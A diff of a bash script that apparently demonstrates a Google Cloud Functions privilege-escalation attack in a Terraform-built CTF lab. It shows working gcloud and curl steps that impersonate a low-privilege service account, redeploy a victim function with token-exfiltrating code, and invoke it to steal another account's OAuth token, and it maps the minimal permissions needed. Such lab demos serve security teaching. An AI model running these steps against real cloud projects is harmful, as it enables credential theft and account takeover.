@@ -15,19 +15,17 @@
 # APIs to read the CTF flag.
 #
 # Modes:
-#   Default (gcloud): uses gcloud functions deploy — clearer, pedagogically
-#     closer to what an attacker would run. Requires two extra gcloud-mechanic
-#     permissions beyond the raw API minimum:
-#       cloudbuild.builds.get            — Cloud Build GetDefaultServiceAccount preflight
-#       resourcemanager.projects.getIamPolicy — project IAM policy validation
-#       run.services.getIamPolicy        — Cloud Run IAM read post-deploy
-#       run.services.setIamPolicy        — Cloud Run IAM set (--no-allow-unauthenticated)
-#     These are included in starting_sa's custom role by Terraform.
+#   Default (gcloud): uses gcloud functions deploy with --build-service-account
+#     to skip the Cloud Build default SA lookup. This eliminates four of the
+#     original seven gcloud-mechanic permissions. Only two irreducible gcloud
+#     overhead permissions remain beyond the raw API minimum:
+#       cloudfunctions.functions.get     — gcloud GetFunction preflight
+#       resourcemanager.projects.get     — unconditional project preflight
 #
 #   --api-only: uses the raw Cloud Functions v2 REST API via curl. Requires
 #     only the true minimum permissions (functions.update + sourceCodeSet +
-#     actAs) — no Cloud Build or IAM policy lookup. Demonstrates the exact
-#     minimal permission surface of the attack.
+#     operations.get + run.routes.invoke + actAs) — no gcloud overhead at all.
+#     Demonstrates the exact minimal permission surface of the attack.
 #
 # Credential model (no static SA keys):
 #   Terraform granted YOUR ADC identity serviceAccountTokenCreator on starting_sa.
@@ -152,19 +150,40 @@ fi
 echo ""
 
 # Step 3: Observe the existing victim function — already runs as target_sa
+# gcloud mode uses `gcloud functions describe` (requires cloudfunctions.functions.get).
+# --api-only mode calls the CF v2 REST API directly (same permission, but raw HTTP).
 echo -e "${YELLOW}Step 3: Observing the existing victim function${NC}"
-show_cmd "$STARTING_SA_EMAIL" \
-    "gcloud functions describe $VICTIM_FUNCTION_NAME --gen2 --region=$REGION --impersonate-service-account=$STARTING_SA_EMAIL"
 
-FUNCTION_SA=$(gcloud functions describe "$VICTIM_FUNCTION_NAME" \
-    --gen2 \
-    --region="$REGION" \
-    --project="$PROJECT_ID" \
-    --impersonate-service-account="$STARTING_SA_EMAIL" \
-    --format="value(serviceConfig.serviceAccountEmail)" 2>/dev/null || true)
+if $USE_GCLOUD; then
+    show_cmd "$STARTING_SA_EMAIL" \
+        "gcloud functions describe $VICTIM_FUNCTION_NAME --gen2 --region=$REGION --impersonate-service-account=$STARTING_SA_EMAIL"
+
+    FUNCTION_SA=$(gcloud functions describe "$VICTIM_FUNCTION_NAME" \
+        --gen2 \
+        --region="$REGION" \
+        --project="$PROJECT_ID" \
+        --impersonate-service-account="$STARTING_SA_EMAIL" \
+        --format="value(serviceConfig.serviceAccountEmail)" 2>/dev/null || true)
+else
+    # raw API — mint access token once here for all api-only steps
+    ACCESS_TOKEN=$(gcloud auth print-access-token \
+        --impersonate-service-account="$STARTING_SA_EMAIL" 2>/dev/null)
+    if [ -z "$ACCESS_TOKEN" ]; then
+        echo -e "${RED}✗ Could not mint access token for $STARTING_SA_EMAIL${NC}"
+        exit 1
+    fi
+
+    show_cmd "$STARTING_SA_EMAIL" \
+        "curl https://cloudfunctions.googleapis.com/v2/projects/$PROJECT_ID/locations/$REGION/functions/$VICTIM_FUNCTION_NAME"
+
+    FUNCTION_DESCRIBE=$(curl -s \
+        -H "Authorization: Bearer $ACCESS_TOKEN" \
+        "https://cloudfunctions.googleapis.com/v2/projects/${PROJECT_ID}/locations/${REGION}/functions/${VICTIM_FUNCTION_NAME}")
+    FUNCTION_SA=$(echo "$FUNCTION_DESCRIBE" | jq -r '.serviceConfig.serviceAccountEmail // empty')
+fi
 
 if [ -z "$FUNCTION_SA" ]; then
-    echo -e "${RED}✗ Could not describe the victim function — check that starting_sa holds${NC}"
+    echo -e "${RED}✗ Could not read the victim function — check that starting_sa holds${NC}"
     echo -e "${RED}  cloudfunctions.functions.get at the project level${NC}"
     exit 1
 fi
@@ -220,20 +239,22 @@ REQEOF
 echo -e "${GREEN}✓ Built malicious function source (entry point: $ENTRY_POINT)${NC}\n"
 
 # Step 5: Replace the function's code
-# gcloud mode: uses gcloud functions deploy — clear, shows the exact commands
-# an attacker would run. Requires cloudbuild.builds.get,
+# gcloud mode: uses gcloud functions deploy with --build-service-account to skip
+# the Cloud Build default SA lookup preflight. This eliminates cloudbuild.builds.get,
 # resourcemanager.projects.getIamPolicy, run.services.getIamPolicy, and
-# run.services.setIamPolicy in addition to the raw API minimums.
+# run.services.setIamPolicy — only functions.get and resourcemanager.projects.get
+# remain as irreducible gcloud overhead.
 #
 # --api-only mode: uses the Cloud Functions v2 REST API directly via curl.
-# Requires only functions.update + sourceCodeSet + actAs — no Cloud Build or
-# IAM policy reads.
+# Requires only functions.update + sourceCodeSet + operations.get + actAs —
+# no gcloud overhead at all. ACCESS_TOKEN was minted in Step 3.
 echo -e "${YELLOW}Step 5: [EXPLOIT] Updating victim function code to exfiltrate target_sa's token${NC}"
 
 if $USE_GCLOUD; then
-    # gcloud mode — the attacker's natural first choice
+    # gcloud mode — --build-service-account skips Cloud Build GetDefaultServiceAccount
+    # and project IAM validation, reducing gcloud-mechanic permissions from 7 to 2.
     show_attack_cmd "$STARTING_SA_EMAIL" \
-        "gcloud functions deploy $VICTIM_FUNCTION_NAME --gen2 --runtime=python312 --region=$REGION --source=$BUILD_DIR/src --entry-point=$ENTRY_POINT --trigger-http --no-allow-unauthenticated --service-account=$TARGET_SA_EMAIL --impersonate-service-account=$STARTING_SA_EMAIL"
+        "gcloud functions deploy $VICTIM_FUNCTION_NAME --gen2 --runtime=python312 --region=$REGION --source=$BUILD_DIR/src --entry-point=$ENTRY_POINT --trigger-http --no-allow-unauthenticated --service-account=$TARGET_SA_EMAIL --build-service-account=projects/${PROJECT_ID}/serviceAccounts/${TARGET_SA_EMAIL} --impersonate-service-account=$STARTING_SA_EMAIL"
 
     if ! gcloud functions deploy "$VICTIM_FUNCTION_NAME" \
             --gen2 \
@@ -244,26 +265,22 @@ if $USE_GCLOUD; then
             --trigger-http \
             --no-allow-unauthenticated \
             --service-account="$TARGET_SA_EMAIL" \
+            --build-service-account="projects/${PROJECT_ID}/serviceAccounts/${TARGET_SA_EMAIL}" \
             --impersonate-service-account="$STARTING_SA_EMAIL" \
             --quiet 2>/dev/null; then
         echo -e "${RED}✗ gcloud functions deploy failed${NC}"
         echo "Check that starting_sa holds cloudfunctions.functions.update, sourceCodeSet,"
-        echo "actAs on target_sa, cloudbuild.builds.get, resourcemanager.projects.getIamPolicy,"
-        echo "run.services.getIamPolicy, and run.services.setIamPolicy"
+        echo "operations.get, run.routes.invoke, actAs on target_sa, functions.get,"
+        echo "and resourcemanager.projects.get"
         echo ""
-        echo "Tip: run with --api-only to use the raw REST API, which needs fewer permissions"
+        echo "Tip: run with --api-only to use the raw REST API, which needs no gcloud overhead"
         exit 1
     fi
     echo -e "${GREEN}✓ Updated $VICTIM_FUNCTION_NAME with exfiltration payload (SA: $TARGET_SA_EMAIL)${NC}\n"
 
 else
     # --api-only mode — minimal permissions, raw REST API
-    ACCESS_TOKEN=$(gcloud auth print-access-token \
-        --impersonate-service-account="$STARTING_SA_EMAIL" 2>/dev/null)
-    if [ -z "$ACCESS_TOKEN" ]; then
-        echo -e "${RED}✗ Could not mint access token for $STARTING_SA_EMAIL${NC}"
-        exit 1
-    fi
+    # ACCESS_TOKEN was minted in Step 3 above
 
     # (a) Get a signed GCS upload URL
     show_attack_cmd "$STARTING_SA_EMAIL" \
@@ -323,23 +340,24 @@ else
         exit 1
     fi
 
-    # Poll until ACTIVE
+    # Poll LRO via raw operations API (requires only cloudfunctions.operations.get)
     echo "Waiting for function update to complete..."
     for i in $(seq 1 20); do
         sleep 10
-        FUNC_STATE=$(gcloud functions describe "$VICTIM_FUNCTION_NAME" \
-            --gen2 --region="$REGION" --project="$PROJECT_ID" \
-            --format="value(state)" \
-            --impersonate-service-account="$STARTING_SA_EMAIL" 2>/dev/null)
-        FUNC_ENTRY=$(gcloud functions describe "$VICTIM_FUNCTION_NAME" \
-            --gen2 --region="$REGION" --project="$PROJECT_ID" \
-            --format="value(buildConfig.entryPoint)" \
-            --impersonate-service-account="$STARTING_SA_EMAIL" 2>/dev/null)
-        if [ "$FUNC_STATE" = "ACTIVE" ] && [ "$FUNC_ENTRY" = "$ENTRY_POINT" ]; then
+        OP_RESPONSE=$(curl -s \
+            -H "Authorization: Bearer $ACCESS_TOKEN" \
+            "https://cloudfunctions.googleapis.com/v2/${OPERATION_NAME}")
+        OP_DONE=$(echo "$OP_RESPONSE" | jq -r '.done // false')
+        OP_ERROR=$(echo "$OP_RESPONSE" | jq -r '.error // empty')
+        if [ "$OP_DONE" = "true" ]; then
+            if [ -n "$OP_ERROR" ] && [ "$OP_ERROR" != "null" ]; then
+                echo -e "${RED}✗ Update operation failed: $OP_ERROR${NC}"
+                exit 1
+            fi
             break
         fi
         if [ "$i" -eq 20 ]; then
-            echo -e "${RED}✗ Function did not become ACTIVE after 200s${NC}"
+            echo -e "${RED}✗ Function update LRO did not complete after 200s${NC}"
             exit 1
         fi
     done
@@ -350,14 +368,21 @@ fi
 # Step 6: Invoke the updated function to steal target_sa's OAuth token.
 # Uses an OIDC identity token (not gcloud functions call, which has a known bug
 # with gen2 HTTP functions + SA impersonation).
+# gcloud mode uses `gcloud functions describe` (cloudfunctions.functions.get).
+# --api-only mode reads the URL from the completed LRO response.
 echo -e "${YELLOW}Step 6: [EXPLOIT] Invoking the updated function to steal target_sa's token${NC}"
 
-FUNCTION_URL=$(gcloud functions describe "$VICTIM_FUNCTION_NAME" \
-    --gen2 \
-    --region="$REGION" \
-    --project="$PROJECT_ID" \
-    --impersonate-service-account="$STARTING_SA_EMAIL" \
-    --format="value(serviceConfig.uri)" 2>/dev/null)
+if $USE_GCLOUD; then
+    FUNCTION_URL=$(gcloud functions describe "$VICTIM_FUNCTION_NAME" \
+        --gen2 \
+        --region="$REGION" \
+        --project="$PROJECT_ID" \
+        --impersonate-service-account="$STARTING_SA_EMAIL" \
+        --format="value(serviceConfig.uri)" 2>/dev/null)
+else
+    # Extract URL from the finished LRO — already fetched in Step 5 polling
+    FUNCTION_URL=$(echo "$OP_RESPONSE" | jq -r '.response.serviceConfig.uri // empty')
+fi
 
 if [ -z "$FUNCTION_URL" ]; then
     echo -e "${RED}✗ Could not retrieve function invocation URL${NC}"
@@ -481,19 +506,17 @@ fi
 
 if $USE_GCLOUD; then
     echo -e "\n${YELLOW}Note on gcloud vs. raw API permissions:${NC}"
-    echo "  This demo used 'gcloud functions deploy', which is the natural tool for this"
-    echo "  attack and shows the clearest command sequence. However, gcloud makes extra"
-    echo "  preflight calls that require permissions beyond the attack's true minimum:"
+    echo "  This demo used 'gcloud functions deploy --build-service-account', which is the"
+    echo "  natural attacker tool and shows the clearest command sequence. Specifying"
+    echo "  --build-service-account eliminates four of the original seven gcloud-mechanic"
+    echo "  permissions (Cloud Build and IAM policy preflights). Only two irreducible"
+    echo "  gcloud overhead permissions remain beyond the raw API minimum:"
     echo ""
-    echo "    cloudbuild.builds.get           — gcloud queries Cloud Build's"
-    echo "                                      GetDefaultServiceAccount endpoint"
-    echo "    resourcemanager.projects.getIamPolicy — gcloud validates the project IAM policy"
-    echo "    run.services.getIamPolicy       — gcloud reads Cloud Run IAM post-deploy"
-    echo "    run.services.setIamPolicy       — gcloud sets Cloud Run IAM for"
-    echo "                                      --no-allow-unauthenticated"
+    echo "    cloudfunctions.functions.get — gcloud GetFunction preflight before every deploy"
+    echo "    resourcemanager.projects.get — unconditional project GET on every gcloud command"
     echo ""
-    echo "  These are included in starting_sa's role by Terraform (labeled as gcloud mechanics)."
-    echo "  To see the attack with only the true minimum permissions, run:"
+    echo "  These are included in starting_sa's gcloud-mechanic role by Terraform."
+    echo "  To see the attack with only the true minimum permissions (no gcloud overhead):"
     echo -e "  ${CYAN}\$ ./demo_attack.sh --api-only${NC}"
 fi
 
